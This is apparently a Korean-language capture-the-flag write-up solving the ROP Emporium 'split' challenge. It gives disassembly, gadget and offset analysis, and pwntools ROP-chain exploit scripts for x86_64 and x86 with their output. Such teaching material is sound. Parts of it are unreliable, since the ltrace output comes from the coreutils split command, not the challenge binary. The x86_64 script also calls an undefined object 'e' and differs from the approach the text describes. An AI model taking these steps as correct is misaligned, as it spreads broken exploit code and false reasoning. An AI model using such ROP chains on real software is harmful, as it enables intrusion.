# [split](https://ropemporium.com/challenge/split.html)
<br />

**Discription:**
> The elements that allowed you to complete ret2win are still present, they've just been split apart.
Find them and recombine them using a short ROP chain.
<br />
<br />

# x86_64

**Binary Protections:**
```yaml
[*] '/home/kali/pico/split'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
<br />

해당 문제는 `system("/bin/cat flag.txt")`를 호출하면 풀리는 간단한 문제입니다. 아래 과정을 통해 풀이를 진행하겠습니다.

```yaml
$ ltrace split
strrchr("split", '/')                                                                          = nil
setlocale(LC_ALL, "")                                                                          = "en_US.UTF-8"
bindtextdomain("coreutils", "/usr/share/locale")                                               = "/usr/share/locale"
textdomain("coreutils")                                                                        = "coreutils"
__cxa_atexit(0x5625290abe10, 0, 0x5625290b6008, 0)                                             = 0
getopt_long(1, 0x7ffe0781e6a8, "0123456789C:a:b:del:n:t:ux", 0x5625290b5860, nil)              = -1
strcmp("-", "-")                                                                               = 0
posix_fadvise(0, 0, 0, 2)                                                                      = 0
fstat(0, 0x5625290b6300)                                                                       = 0
getpagesize()                                                                                  = 4096
aligned_alloc(4096, 0x40001, 0x40000, 0x3fc00)                                                 = 0x7f0559721000
read(0, "\n", 262144)                                                                          = 1
...
read(0^C <no return ...>
--- SIGINT (Interrupt) ---
+++ killed by SIGINT +++
```
우선 `ltrace`를 통해 `read()`가 `262144`만큼 읽고, 스택 버퍼오버플로우가 발생하는 것을 알 수 있습니다.

```yaml
$ r2 split
aWARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x004005b0]> aaa
...
[0x004005b0]> afl
0x00400550    1      6 sym.imp.puts
0x00400560    1      6 sym.imp.system
0x00400570    1      6 sym.imp.printf
0x00400580    1      6 sym.imp.memset
0x00400590    1      6 sym.imp.read
0x004005a0    1      6 sym.imp.setvbuf
0x004005b0    1     42 entry0
0x004005f0    4     37 sym.deregister_tm_clones
0x00400620    4     55 sym.register_tm_clones
0x00400660    3     29 entry.fini0
0x00400690    1      7 entry.init0
0x004006e8    1     90 sym.pwnme
0x00400742    1     17 sym.usefulFunction
0x004007d0    1      2 sym.__libc_csu_fini
0x004007d4    1      9 sym._fini
0x00400760    4    101 sym.__libc_csu_init
0x004005e0    1      2 sym._dl_relocate_static_pie
0x00400697    1     81 main
0x00400528    3     23 sym._init
[0x004005b0]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   ---------- GLOBAL FUNC       __libc_start_main
7   ---------- WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf
[0x004005b0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
6   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```
`radare2`를 통해 바이너리에서 `system()`을 사용하고 있고, `"/bin/cat flag.txt"`의 주소가 `0x00601060`인 것을 알 수 있습니다. 그리고 `pwnme`, `usefulFunction`, `main` 심볼들이 존재하는 것을 알 수 있습니다.

```yaml
$ objdump -d split
...
0000000000400742 <usefulFunction>:
  400742:       55                      push   %rbp
  400743:       48 89 e5                mov    %rsp,%rbp
  400746:       bf 4a 08 40 00          mov    $0x40084a,%edi
  40074b:       e8 10 fe ff ff          call   400560 <system@plt>
  400750:       90                      nop
  400751:       5d                      pop    %rbp
  400752:       c3                      ret
  400753:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  40075a:       00 00 00
  40075d:       0f 1f 00                nopl   (%rax)
...
```
문제에서 제공하는 `usefulFunction()`는 `system()`을 호출해줍니다. 하지만 ROP로 `system("/bin/cat flag.txt")`를 만들어 직접 호출을 해줄 것이므로, 바로 호출이 가능한 `0x40074b`를 사용해줍니다.

```yaml
$ ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
```
다음으로 `system()`의 인자인 `/bin/cat flag.txt`를 설정해줘야 하기 때문에 `rdi` 가젯을 확보합니다.

```yaml
$ python3 -q
>>> from pwn import *
>>> p = process("./split")
[+] Starting local process './split': pid 33083
>>> p.send(cyclic(200, n=8))
>>> p.wait()
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 33083)
>>> Corefile("./core.33083")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.33083'
    Arch:      amd64-64-little
    RIP:       0x400741
    RSP:       0x7ffe67faeab8
    Exe:       '/home/kali/pico/split' (0x400000)
    Fault:     0x6161616161616166
Corefile('/home/kali/pico/core.33083')
>>> cyclic_find(0x6161616161616166, n=8)
40
```
마지막으로 반환주소를 덮으려면, 버퍼와 반환주소 사이의 거리를 알아야 합니다. 위 과정으로 두 주소 간의 거리는 40 입니다. 알아낸 정보를 가지고 공격 코드를 작성할 수 있습니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

p = process("./split")
    
rdi = 0x4007c3
str = 0x601060
system = e.sym["system"]
pay = flat({0x28:rdi}, str, system)

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> $
```

<br />
<br />

# x86

```python
from pwn import *

context.log_level = "error"
context.arch = "x86"

p = process("./split32")

flag = 0x0804a030   # "/bin/cat flag.txt"
system = 0x804861a

pay = flat({44:system}, flag)  # "\x00"*44 + call system("/bin/cat flag.txt")

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```
